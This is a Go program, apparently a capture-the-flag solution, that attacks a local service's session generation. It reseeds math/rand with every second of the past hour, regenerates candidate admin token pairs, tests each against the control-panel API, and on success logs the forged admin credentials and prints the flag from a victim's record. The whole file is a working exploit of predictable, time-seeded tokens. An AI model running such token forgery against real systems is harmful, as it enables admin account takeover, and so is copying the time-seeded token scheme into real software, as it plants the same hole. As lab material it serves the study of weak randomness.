package main

import (
	"1_session_generation/pkg/api"
	"1_session_generation/pkg/helper"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	log "github.com/sirupsen/logrus"
	"math/rand"
	"time"
)

func main() {
	err := Run("127.0.0.1")
	if err != nil {
		log.Error(err)
		return
	}
}

func Run(addr string) error {
	endpoints := helper.GetEndpoint(&addr)
	now := time.Now()
	tokenKey, token, err := helper.CreateUser(endpoints.GetWebUrl())
	if err != nil {
		return err
	}
	for i := time.Now().Add(-60 * time.Minute); !i.After(now); i = i.Add(time.Second) {
		err, done := CheckSeed(i, endpoints, tokenKey, token)
		if done {
			return err
		}
	}

	return errors.New("Something wrong")
}

func CheckSeed(i time.Time, endpoints helper.Endpoints, victimTokenKey string, victimToken string) (error, bool) {
	rand.Seed(i.Unix())
	lastb := make([]byte, 8)
	binary.LittleEndian.PutUint64(lastb, rand.Uint64())
	first := hex.EncodeToString(lastb)
	for j := 0; j < 5; j++ {
		nextb := make([]byte, 8)
		binary.LittleEndian.PutUint64(nextb, rand.Uint64())
		second := hex.EncodeToString(nextb)
		err, done := TestCredentials(endpoints, second, first, victimTokenKey, victimToken)
		if done {
			return err, done
		}
		first = second
	}
	return nil, false
}

func TestCredentials(endpoints helper.Endpoints, tokenKey string, token string, victimTokenKey string, victimToken string) (error, bool) {
	client := api.NewClient(endpoints.GetCPUrl(), tokenKey, token)
	_, err := client.CreateUser()
	if err == nil {
		log.Info(fmt.Sprintf("Admin victimTokenKey: %s  Admin victimToken: %s", tokenKey, token))
		user, err := client.GetUser(victimTokenKey)
		if err != nil {
			return err, true
		}
		if hex.EncodeToString(user.Token) == victimToken {
			log.Info("Flag : " + user.Description)
			return nil, true
		}
		return errors.New("Can't get token"), true
	}
	return nil, false
}
